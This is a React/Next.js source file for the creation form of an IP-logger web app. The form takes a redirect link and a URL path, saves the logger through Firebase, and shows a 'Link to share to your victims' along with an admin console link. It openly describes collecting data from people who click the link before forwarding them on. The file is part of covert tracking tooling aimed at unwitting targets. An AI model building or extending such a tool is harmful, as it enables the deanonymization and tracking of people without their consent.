"use client";

import VInput from "@/components/vinput.component";
import { app } from "@/config/firebase";
import IpLoggerService from "@/services/ip_logger_service";
import { getFirestore, collection, getDocs } from "firebase/firestore/lite";
import { useState } from "react";

export default function CreateNewLogger() {
  const service = new IpLoggerService();
  const createNewLogger = async (e: any) => {
    e.preventDefault();
    try {
      const documentRef = await service.createLogger({
        path,
        link,
      });
      setReference(documentRef.id);
    } catch (e: any) {
      console.log(e);
    }
  };

  const [link, setLink] = useState("");
  const [path, setPath] = useState("");

  const [reference, setReference] = useState<string | null>(null);

  const victimUrl = `${process.env.NEXT_PUBLIC_APP_URL}/v/${path}`;

  return (
    <div>
      {reference && (
        <div
          id="toast-interactive"
          className="w-full mb-5 px-4 py-4 text-gray-500 bg-white rounded-lg shadow dark:bg-gray-800 dark:text-gray-400"
          role="alert"
        >
          <div className="flex">
            <div className="inline-flex items-center justify-center flex-shrink-0 w-8 h-8 text-blue-500 bg-blue-100 rounded-lg dark:text-blue-300 dark:bg-blue-900">
              <svg
                className="w-4 h-4"
                aria-hidden="true"
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 18 20"
              >
                <path
                  stroke="currentColor"
                  d="M16 1v5h-5M2 19v-5h5m10-4a8 8 0 0 1-14.947 3.97M1 10a8 8 0 0 1 14.947-3.97"
                />
              </svg>
              <span className="sr-only">Refresh icon</span>
            </div>
            <div className="ms-3 text-sm font-normal">
              <span className="mb-1 text-sm font-semibold text-gray-900 dark:text-white">
                IP Logger created
              </span>
              <div className="mb-2 text-sm font-normal">
                Follow the link to access the administration console of the
                logger.
                <br />
                Note your logger's reference for later use: <b>{reference}</b>
                <br />
                <br />
                <u>Link to share to your victims:</u>
                <input type="text" value={victimUrl} readOnly />
              </div>
              <div className="grid grid-cols-2 gap-2">
                <div>
                  <a
                    href={`${process.env.NEXT_PUBLIC_APP_URL}/panel/${reference}`}
                    className="inline-flex justify-center w-full px-2 py-1.5 text-xs font-medium text-center text-white bg-blue-600 rounded-lg hover:bg-blue-700 focus:ring-4 focus:outline-none focus:ring-blue-300 dark:bg-blue-500 dark:hover:bg-blue-600 dark:focus:ring-blue-800"
                  >
                    Go to console
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
      <form className="mb-0 space-y-6" onSubmit={createNewLogger}>
        <VInput
          type="text"
          name="link"
          id="link"
          label="Link to forward use to"
          model={link}
          setModel={setLink}
          small="A link the user will be redirected to once we collected his datas"
        ></VInput>
        <VInput
          type="text"
          name="url"
          id="url"
          label="URL Path"
          model={path}
          setModel={setPath}
          small={`This is the link to share to your victims. eg: ${process.env.NEXT_PUBLIC_APP_URL}/v/${path}`}
        ></VInput>
        <div className="w-full flex justify-center px-2">
          <button className="inline-flex justify-center w-full px-2 py-1.5 text-xs font-medium text-center text-white bg-green-500 rounded-lg hover:bg-green-600 focus:ring-4 focus:outline-none focus:ring-blue-300 dark:bg-blue-500 dark:hover:bg-blue-600 dark:focus:ring-blue-800">
            Create logger
          </button>
        </div>
      </form>
    </div>
  );
}
